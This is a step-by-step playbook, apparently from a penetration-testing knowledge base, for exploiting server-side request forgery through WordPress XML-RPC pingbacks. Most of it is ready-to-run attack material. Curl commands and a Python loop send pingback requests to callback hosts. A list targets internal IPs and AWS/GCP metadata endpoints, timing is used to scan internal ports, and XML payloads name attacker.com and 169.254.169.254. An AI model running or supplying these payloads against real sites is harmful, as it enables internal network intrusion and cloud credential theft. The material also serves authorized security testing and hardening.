# Scenario: SSRF via XML-RPC Pingback

## Overview
A step-by-step workflow for testing and exploiting SSRF through WordPress XML-RPC's `pingback.ping` method. This is applicable to any WordPress installation where XML-RPC is enabled.

## When This Happens
- You discover `/xmlrpc.php` on a WordPress target (via dir scanning, Wayback Machine, or robots.txt).
- WPScan or manual testing confirms XML-RPC is accessible.
- The server responds to `system.listMethods` with available methods.

## Recon / Detection

### Step 1: Confirm XML-RPC exists
```bash
curl -s -o /dev/null -w "%{http_code}" https://target.com/xmlrpc.php
# 200 or 405 = exists; 404 = not present
```

### Step 2: Enumerate available methods
```bash
curl -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
```

Look for `pingback.ping` in the response. If present → SSRF is testable.

### Step 3: Check if pingback makes outbound requests
```bash
curl -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<methodCall>
    <methodName>pingback.ping</methodName>
    <params>
      <param><value><string>http://UNIQUE-ID.your-collaborator.com</string></value></param>
      <param><value><string>https://target.com/</string></value></param>
    </params>
  </methodCall>'
```

Check your collaborator for an incoming request from the target's IP.

## Exploitation Steps

### 1. Basic SSRF confirmation
Use unique subdomains per request to distinguish callbacks:

```python
import requests, uuid

target = "https://target.com/xmlrpc.php"
callback = "your-collaborator.com"

for i in range(5):
    sub = uuid.uuid4().hex[:12]
    data = f"""<methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param><value><string>http://{sub}.{callback}</string></value></param>
        <param><value><string>https://target.com/</string></value></param>
      </params>
    </methodCall>"""
    r = requests.post(target, data=data, headers={"Content-Type": "text/xml"})
    print(f"[{r.status_code}] {sub}.{callback}")
```

### 2. Internal network probing
Replace the callback URL with internal addresses:
```
http://127.0.0.1:80
http://127.0.0.1:8080
http://192.168.1.1
http://169.254.169.254/latest/meta-data/  (AWS metadata)
http://metadata.google.internal/            (GCP metadata)
```

### 3. Port scanning via response timing
Different ports may produce different response times or error messages, revealing open vs closed internal services.

## Example Payloads
```xml
<!-- Basic SSRF to collaborator -->
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://attacker.com/ssrf-test</string></value></param>
    <param><value><string>https://target.com/</string></value></param>
  </params>
</methodCall>

<!-- Cloud metadata -->
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param>
    <param><value><string>https://target.com/</string></value></param>
  </params>
</methodCall>
```

## Tools
- **curl**: Manual XML-RPC testing.
- **Python requests**: Scripted testing with unique subdomains.
- **Burp Collaborator / RequestRepo**: Detect outbound callbacks.
- **WPScan**: Detect XML-RPC and enumerate methods.

## Real-World Notes
- XML-RPC is enabled by default in WordPress — many admins don't know it exists.
- Even if the response doesn't leak data, the outbound request itself confirms SSRF.
- Combine with cloud metadata access for critical-severity findings.

## References
- `case-studies/case-study-ssrf-xmlrpc-wordpress.md`
- `techniques/xxe-injection.md`
- `methodology/web-recon-methodology.md`
